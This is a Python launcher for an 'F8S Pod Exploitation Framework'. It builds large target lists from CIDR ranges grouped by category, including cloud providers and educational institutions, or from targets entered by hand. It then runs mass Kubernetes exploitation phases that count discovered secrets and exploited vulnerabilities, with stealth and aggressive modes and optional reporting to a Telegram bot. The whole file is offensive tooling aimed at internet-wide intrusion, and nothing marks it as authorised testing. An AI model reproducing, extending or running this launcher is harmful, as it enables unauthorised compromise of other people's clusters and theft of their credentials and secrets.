#!/usr/bin/env python3
"""
🚀 Optimized F8S Mega Launch - Enhanced Launcher with Mega CIDR UHQ Integration
Author: wKayaa | F8S Pod Exploitation Framework | 2025-01-28

Enhanced launcher integrating the Mega CIDR UHQ system with the existing
F8S Pod Exploitation Framework for maximum Kubernetes cluster discovery.
"""

import asyncio
import json
import datetime
import sys
import multiprocessing
import time
from typing import Dict, List, Optional, Any
from pathlib import Path

# Try to import psutil for enhanced monitoring
try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

# Import existing F8S framework components
try:
    from f8s_exploit_pod import F8sPodExploiter, run_f8s_exploitation
    from mega_cidr_uhq import MegaCIDRUHQ, CIDRTarget, ScanStrategy
    from kubernetes_advanced import KubernetesAdvancedExploitation, ExploitationConfig, ExploitationMode
except ImportError as e:
    print(f"❌ Import error: {e}")
    print("⚠️  Make sure all required modules are available")
    sys.exit(1)

class OptimizedF8SMegaLauncher:
    """Enhanced F8S launcher with Mega CIDR UHQ integration"""
    
    def __init__(self, 
                 telegram_token: Optional[str] = None,
                 stealth_mode: bool = True,
                 max_concurrent: int = None,
                 testing_mode: bool = False):
        self.telegram_token = telegram_token
        self.stealth_mode = stealth_mode
        self._testing_mode = testing_mode
        
        # Auto-optimize concurrency based on system resources
        self.max_concurrent = self._optimize_concurrency(max_concurrent)
        
        self.session_id = f"f8s_mega_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        # Initialize mega CIDR system
        self.mega_cidr = MegaCIDRUHQ()
        
        # Initialize F8S exploiter
        self.f8s_exploiter = F8sPodExploiter(
            telegram_token=telegram_token,
            stealth_mode=stealth_mode
        )
        
        # Initialize advanced Kubernetes exploitation
        self.k8s_config = ExploitationConfig(
            mode=ExploitationMode.AGGRESSIVE if not stealth_mode else ExploitationMode.PASSIVE,
            max_concurrent_clusters=max_concurrent,
            timeout_per_operation=10 if not stealth_mode else 30
        )
        self.k8s_exploiter = KubernetesAdvancedExploitation(self.k8s_config)
        
        # Results tracking
        self.results = {
            'session_id': self.session_id,
            'start_time': datetime.datetime.now().isoformat(),
            'targets_scanned': 0,
            'clusters_found': 0,
            'secrets_discovered': 0,
            'vulnerabilities_exploited': 0,
            'categories_processed': [],
            'high_value_targets': []
        }
        
        print(f"🚀 Optimized F8S Mega Launcher initialized - Session: {self.session_id}")
        print(f"⚡ Max concurrent: {self.max_concurrent} (optimized for {multiprocessing.cpu_count()} cores)")
    
    def _optimize_concurrency(self, user_max: Optional[int]) -> int:
        """Optimize concurrency based on system resources"""
        cpu_cores = multiprocessing.cpu_count()
        
        # Calculate optimal concurrency
        if HAS_PSUTIL:
            # Enhanced calculation with memory consideration
            memory_gb = psutil.virtual_memory().total / (1024**3)
            # Estimate connections per GB (conservative: 50 connections per GB)
            memory_limit = int(memory_gb * 50)
            
            # CPU-based limit (conservative: 100 connections per core)
            cpu_limit = cpu_cores * 100
            
            # Use the lower of the two limits for safety
            optimal = min(memory_limit, cpu_limit)
            
            print(f"💾 System: {memory_gb:.1f}GB RAM, {cpu_cores} cores")
            print(f"🔧 Calculated optimal concurrency: {optimal}")
        else:
            # Fallback calculation without psutil
            optimal = cpu_cores * 75  # Conservative estimate
            print(f"💻 System: {cpu_cores} cores (basic detection)")
            print(f"🔧 Calculated optimal concurrency: {optimal}")
        
        if user_max is not None:
            if user_max > optimal * 2:
                print(f"⚠️  Warning: User specified {user_max} exceeds recommended {optimal}")
                # For testing, skip interactive prompt if _testing_mode is set
                if hasattr(self, '_testing_mode') and self._testing_mode:
                    print("   (Testing mode: auto-accepting high concurrency)")
                    return user_max
                else:
                    response = input(f"Continue with high concurrency? Risk: system overload (y/n): ")
                    if response.lower() != 'y':
                        return optimal
            return user_max
        
        return optimal
    
    async def select_target_strategy(self) -> Dict[str, Any]:
        """Interactive target selection strategy"""
        print("\n🎯 TARGET STRATEGY SELECTION")
        print("=" * 40)
        
        strategies = {
            '1': {
                'name': 'Stealth Maximum Coverage',
                'description': 'Comprehensive scan with stealth mode',
                'priority_threshold': 5,
                'max_targets': 5000,
                'stealth_mode': True,
                'include_ipv6': False
            },
            '2': {
                'name': 'Aggressive High-Priority',
                'description': 'Fast scan of high-probability targets',
                'priority_threshold': 8,
                'max_targets': 2000,
                'stealth_mode': False,
                'include_ipv6': False
            },
            '3': {
                'name': 'Cloud Provider Focus',
                'description': 'Target cloud providers aggressively',
                'categories': ['cloud_providers', 'container_orchestration'],
                'stealth_mode': False,
                'max_targets': 3000
            },
            '4': {
                'name': 'Safe Educational/Research',
                'description': 'Target educational and research institutions',
                'categories': ['educational', 'emerging_markets'],
                'stealth_mode': True,
                'max_targets': 1500
            },
            '5': {
                'name': 'Custom Selection',
                'description': 'Custom category and parameter selection',
                'custom': True
            },
            '6': {
                'name': 'Manual Target Entry',
                'description': 'Enter targets manually (IP:PORT, hostnames)',
                'manual': True
            }
        }
        
        print("Available strategies:")
        for key, strategy in strategies.items():
            risk = "🛡️ Safe" if strategy.get('stealth_mode', True) else "⚡ Aggressive"
            print(f"  {key}. {strategy['name']} - {strategy['description']} ({risk})")
        
        choice = input("\nSelect strategy (1-6) [default: 1]: ").strip() or '1'
        
        if choice in strategies:
            selected = strategies[choice]
            
            if selected.get('custom'):
                return await self.custom_strategy_selection()
            elif selected.get('manual'):
                return await self.manual_target_selection()
            else:
                print(f"✅ Selected: {selected['name']}")
                return selected
        else:
            print("⚠️  Invalid selection, using default stealth strategy")
            return strategies['1']
    
    async def custom_strategy_selection(self) -> Dict[str, Any]:
        """Custom strategy selection"""
        print("\n🛠️  CUSTOM STRATEGY CONFIGURATION")
        print("=" * 40)
        
        # Show available categories
        stats = self.mega_cidr.get_category_statistics()
        print("\nAvailable categories:")
        for i, (category, data) in enumerate(stats.items(), 1):
            risk = "🔒 Stealth Required" if data['stealth_required'] else "🔓 Safe"
            print(f"  {i}. {category} - {data['total_ranges']} ranges ({risk})")
        
        # Category selection
        selected_categories = []
        category_list = list(stats.keys())
        
        while True:
            selection = input(f"\nSelect categories (1-{len(category_list)}, comma-separated) or 'all': ").strip()
            
            if selection.lower() == 'all':
                selected_categories = category_list
                break
            
            try:
                indices = [int(x.strip()) - 1 for x in selection.split(',')]
                selected_categories = [category_list[i] for i in indices if 0 <= i < len(category_list)]
                break
            except (ValueError, IndexError):
                print("❌ Invalid selection, please try again")
        
        # Parameter configuration
        max_targets = int(input("Max targets (default: 2000): ").strip() or "2000")
        stealth_mode = input("Stealth mode? (y/n) [default: y]: ").strip().lower() != 'n'
        include_ipv6 = input("Include IPv6? (y/n) [default: n]: ").strip().lower() == 'y'
        
        return {
            'name': 'Custom Strategy',
            'categories': selected_categories,
            'max_targets': max_targets,
            'stealth_mode': stealth_mode,
            'include_ipv6': include_ipv6
        }
    
    async def manual_target_selection(self) -> Dict[str, Any]:
        """Manual target entry with validation"""
        print("\n📝 MANUAL TARGET ENTRY")
        print("=" * 40)
        print("Enter targets one per line. Formats supported:")
        print("  - IP address: 192.168.1.10")
        print("  - IP with port: 192.168.1.10:6443")
        print("  - Hostname: kubernetes.local")
        print("  - Hostname with port: k8s.example.com:8443")
        print("  - CIDR range: 192.168.1.0/24")
        print("\nEnter empty line to finish, 'help' for examples")
        
        targets = []
        target_count = 0
        
        while True:
            target = input(f"Target {target_count + 1}: ").strip()
            
            if not target:
                break
            
            if target.lower() == 'help':
                print("\n📚 Examples:")
                print("  192.168.1.100:6443")
                print("  10.0.0.5")
                print("  kubernetes.docker.internal:6443")
                print("  minikube.local:8443")
                print("  10.0.0.0/24")
                continue
            
            # Validate and add target
            if self._validate_manual_target(target):
                targets.append(target)
                target_count += 1
                print(f"✅ Added: {target}")
                
                # Show progress
                if target_count % 10 == 0:
                    print(f"📊 Targets added: {target_count}")
            else:
                print(f"❌ Invalid format: {target}")
                print("   Use format: IP:PORT, hostname:PORT, or CIDR")
        
        if not targets:
            print("❌ No valid targets entered")
            return await self.select_target_strategy()
        
        print(f"\n✅ Total targets collected: {len(targets)}")
        
        # Expand CIDR ranges if any
        expanded_targets = []
        for target in targets:
            if '/' in target:
                # CIDR range - expand to individual IPs
                expanded = self._expand_cidr_range(target)
                expanded_targets.extend(expanded)
                print(f"🌐 Expanded {target} to {len(expanded)} IPs")
            else:
                expanded_targets.append(target)
        
        # Ask for configuration
        stealth_mode = input("Enable stealth mode for manual targets? (y/n) [default: y]: ").strip().lower() != 'n'
        
        return {
            'name': 'Manual Target Entry',
            'targets': expanded_targets,
            'stealth_mode': stealth_mode,
            'manual_entry': True
        }
    
    def _validate_manual_target(self, target: str) -> bool:
        """Validate manually entered target"""
        if not target:
            return False
        
        # Check for CIDR notation
        if '/' in target:
            try:
                import ipaddress
                ipaddress.ip_network(target, strict=False)
                return True
            except:
                return False
        
        # Allow IP addresses without ports (default port will be assumed)
        if ':' not in target:
            # Simple IP validation
            parts = target.split('.')
            if len(parts) == 4:
                try:
                    return all(0 <= int(part) <= 255 for part in parts)
                except ValueError:
                    return False
            # Or hostname without port
            return bool(target and len(target) > 0)
        
        # Has port specification
        parts = target.split(':')
        if len(parts) != 2:
            return False
        host, port = parts
        if not host or not port:
            return False
        
        # Validate port
        try:
            port_num = int(port)
            if not (1 <= port_num <= 65535):
                return False
        except ValueError:
            return False
            
        # Validate host (IP or hostname)
        if '.' in host:
            # Check if it's an IP
            ip_parts = host.split('.')
            if len(ip_parts) == 4:
                try:
                    return all(0 <= int(part) <= 255 for part in ip_parts)
                except ValueError:
                    pass
        
        # Accept as hostname if not IP
        return bool(host)
    
    def _expand_cidr_range(self, cidr: str, max_ips: int = 100) -> List[str]:
        """Expand CIDR range to individual IP addresses"""
        try:
            import ipaddress
            network = ipaddress.ip_network(cidr, strict=False)
            
            # Limit expansion for large networks
            hosts = list(network.hosts())
            if len(hosts) > max_ips:
                print(f"⚠️  Large network {cidr} ({len(hosts)} hosts), limiting to first {max_ips}")
                hosts = hosts[:max_ips]
            
            return [str(ip) for ip in hosts]
        except Exception as e:
            print(f"❌ Error expanding CIDR {cidr}: {e}")
            return []
    
    def generate_targets_from_strategy(self, strategy: Dict[str, Any]) -> List[str]:
        """Generate target list from strategy"""
        print(f"\n🎯 Generating targets using strategy: {strategy['name']}")
        
        # Handle manual target entry
        if strategy.get('manual_entry'):
            targets = strategy.get('targets', [])
            print(f"📝 Using {len(targets)} manually entered targets")
            return targets
        
        if 'categories' in strategy:
            # Category-based selection
            targets = self.mega_cidr.get_targets_by_category(strategy['categories'])
            target_cidrs = [t.cidr for t in targets]
            
            # Expand CIDRs to IPs
            all_ips = []
            for cidr in target_cidrs:
                ips = self.mega_cidr.expand_cidr_to_ips(cidr, max_ips=50)
                all_ips.extend(ips)
            
            # Limit to max targets
            max_targets = strategy.get('max_targets', 2000)
            return all_ips[:max_targets]
        
        else:
            # Priority-based selection
            return self.mega_cidr.generate_optimized_target_list(
                priority_threshold=strategy.get('priority_threshold', 5),
                max_targets=strategy.get('max_targets', 2000),
                stealth_mode=strategy.get('stealth_mode', True),
                include_ipv6=strategy.get('include_ipv6', False)
            )
    
    async def run_comprehensive_scan(self, targets: List[str], strategy: Dict[str, Any]):
        """Run comprehensive scan using both F8S and K8S exploiters with real-time monitoring"""
        print(f"\n🚀 Starting comprehensive scan of {len(targets)} targets")
        print(f"💪 Strategy: {strategy['name']}")
        print(f"🛡️  Stealth mode: {strategy.get('stealth_mode', True)}")
        print(f"⚡ Max concurrent: {self.max_concurrent}")
        
        # Initialize resource monitoring
        scan_start_time = time.time()
        self.results['targets_scanned'] = len(targets)
        
        # Display system resources
        if HAS_PSUTIL:
            cpu_percent = psutil.cpu_percent()
            memory = psutil.virtual_memory()
            print(f"💻 System: CPU {cpu_percent}%, RAM {memory.percent}% ({memory.available / (1024**3):.1f}GB available)")
        
        # Phase 1: F8S Pod Exploitation
        print("\n📡 PHASE 1: F8S Pod Exploitation")
        print("-" * 40)
        
        phase1_start = time.time()
        try:
            f8s_results = await self._run_f8s_with_monitoring(targets, strategy)
            
            if f8s_results:
                self.results['secrets_discovered'] += len(f8s_results.get('secrets', []))
                self.results['vulnerabilities_exploited'] += len(f8s_results.get('exploits', []))
                
                # Extract high-value targets
                for result in f8s_results.get('successful_targets', []):
                    self.results['high_value_targets'].append({
                        'target': result,
                        'phase': 'f8s_exploitation',
                        'timestamp': datetime.datetime.now().isoformat()
                    })
            
            phase1_duration = time.time() - phase1_start
            print(f"✅ F8S Phase completed ({phase1_duration:.1f}s)")
        
        except Exception as e:
            print(f"❌ F8S Phase error: {e}")
        
        # Display progress and resources
        self._display_progress_update(scan_start_time, 1, 2)
        
        # Phase 2: Advanced Kubernetes Exploitation
        print("\n🔧 PHASE 2: Advanced Kubernetes Exploitation")
        print("-" * 50)
        
        phase2_start = time.time()
        try:
            await self.k8s_exploiter.run_exploitation(targets)
            k8s_summary = self.k8s_exploiter.get_summary()
            
            if k8s_summary:
                self.results['clusters_found'] += k8s_summary.get('clusters_discovered', 0)
                
                # Extract cluster information
                for cluster in k8s_summary.get('active_clusters', []):
                    self.results['high_value_targets'].append({
                        'target': cluster,
                        'phase': 'k8s_exploitation',
                        'timestamp': datetime.datetime.now().isoformat()
                    })
            
            phase2_duration = time.time() - phase2_start
            print(f"✅ K8s Phase completed ({phase2_duration:.1f}s)")
        
        except Exception as e:
            print(f"❌ K8s Phase error: {e}")
        
        # Final progress and summary
        self._display_progress_update(scan_start_time, 2, 2)
        
        # Update results
        self.results['end_time'] = datetime.datetime.now().isoformat()
        total_duration = time.time() - scan_start_time
        self.results['total_duration'] = total_duration
        
        print(f"\n🎯 SCAN COMPLETED - Session: {self.session_id} ({total_duration:.1f}s)")
    
    async def _run_f8s_with_monitoring(self, targets: List[str], strategy: Dict[str, Any]):
        """Run F8S exploitation with progress monitoring"""
        return await run_f8s_exploitation(
            target_ranges=targets,
            telegram_token=self.telegram_token,
            exploiter=self.f8s_exploiter,
            max_concurrent=self.max_concurrent,  # Full concurrency, no artificial limits
            timeout=10 if not self.stealth_mode else 30
        )
    
    def _display_progress_update(self, start_time: float, current_phase: int, total_phases: int):
        """Display progress and resource utilization"""
        elapsed = time.time() - start_time
        progress_percent = (current_phase / total_phases) * 100
        
        print(f"\n📊 PROGRESS UPDATE")
        print(f"   Phase: {current_phase}/{total_phases} ({progress_percent:.1f}%)")
        print(f"   Elapsed: {elapsed:.1f}s")
        
        if HAS_PSUTIL:
            cpu_percent = psutil.cpu_percent()
            memory = psutil.virtual_memory()
            print(f"   CPU: {cpu_percent}% | RAM: {memory.percent}% | Available: {memory.available / (1024**3):.1f}GB")
            
            # Resource utilization assessment
            if cpu_percent > 80:
                print("   ⚠️  High CPU usage detected")
            if memory.percent > 85:
                print("   ⚠️  High memory usage detected")
        
        # Estimate completion time
        if current_phase < total_phases:
            estimated_total = (elapsed / current_phase) * total_phases
            eta = estimated_total - elapsed
            print(f"   ETA: {eta:.1f}s remaining")
    
    def print_results_summary(self):
        """Print comprehensive results summary"""
        print("\n" + "=" * 60)
        print("🎯 OPTIMIZED F8S MEGA SCAN RESULTS")
        print("=" * 60)
        
        print(f"📊 Session ID: {self.results['session_id']}")
        print(f"⏱️  Duration: {self.results.get('start_time', 'N/A')} - {self.results.get('end_time', 'N/A')}")
        print(f"🎯 Targets scanned: {self.results['targets_scanned']}")
        print(f"🏢 Clusters found: {self.results['clusters_found']}")
        print(f"🔐 Secrets discovered: {self.results['secrets_discovered']}")
        print(f"⚡ Vulnerabilities exploited: {self.results['vulnerabilities_exploited']}")
        print(f"💎 High-value targets: {len(self.results['high_value_targets'])}")
        
        if self.results['high_value_targets']:
            print("\n🏆 HIGH-VALUE TARGETS DISCOVERED:")
            for i, target in enumerate(self.results['high_value_targets'][:10], 1):
                print(f"  {i}. {target['target']} ({target['phase']}) - {target['timestamp']}")
            
            if len(self.results['high_value_targets']) > 10:
                print(f"  ... and {len(self.results['high_value_targets']) - 10} more")
        
        # Save results
        results_file = f"f8s_mega_results_{self.session_id}.json"
        with open(results_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        print(f"\n💾 Results saved to: {results_file}")
    
    async def run(self):
        """Main execution flow"""
        try:
            # Display mega CIDR summary
            self.mega_cidr.print_summary()
            
            # Strategy selection
            strategy = await self.select_target_strategy()
            
            # Generate targets
            targets = self.generate_targets_from_strategy(strategy)
            
            if not targets:
                print("❌ No targets generated, exiting")
                return
            
            print(f"✅ Generated {len(targets)} targets for scanning")
            
            # Confirmation for aggressive scans
            if not strategy.get('stealth_mode', True):
                confirm = input(f"\n⚠️  This will perform an AGGRESSIVE scan of {len(targets)} targets. Continue? (y/n): ")
                if confirm.lower() != 'y':
                    print("🛑 Scan cancelled by user")
                    return
            
            # Execute comprehensive scan
            await self.run_comprehensive_scan(targets, strategy)
            
            # Print results
            self.print_results_summary()
            
            print("\n🎯 F8S MEGA LAUNCHER COMPLETED SUCCESSFULLY!")
        
        except KeyboardInterrupt:
            print("\n🛑 Scan interrupted by user")
            self.results['end_time'] = datetime.datetime.now().isoformat()
            self.print_results_summary()
        
        except Exception as e:
            print(f"\n❌ Critical error: {e}")
            import traceback
            traceback.print_exc()

def main():
    """Main function"""
    print("🚀 OPTIMIZED F8S MEGA LAUNCHER")
    print("Enhanced F8S with Ultra-Comprehensive CIDR Database")
    print("=" * 60)
    
    # Configuration
    telegram_token = input("Telegram bot token (optional): ").strip() or None
    stealth_mode = input("Enable stealth mode? (y/n) [default: y]: ").strip().lower() != 'n'
    
    # Smart concurrency configuration
    print(f"\n⚡ CONCURRENCY CONFIGURATION")
    print(f"   System detected: {multiprocessing.cpu_count()} CPU cores")
    if HAS_PSUTIL:
        memory_gb = psutil.virtual_memory().total / (1024**3)
        print(f"   Available memory: {memory_gb:.1f} GB")
    
    max_concurrent_input = input("Max concurrent scans (press Enter for auto-optimization): ").strip()
    max_concurrent = int(max_concurrent_input) if max_concurrent_input else None
    
    # Initialize and run launcher
    launcher = OptimizedF8SMegaLauncher(
        telegram_token=telegram_token,
        stealth_mode=stealth_mode,
        max_concurrent=max_concurrent
    )
    
    # Run async main loop
    asyncio.run(launcher.run())

if __name__ == "__main__":
    main()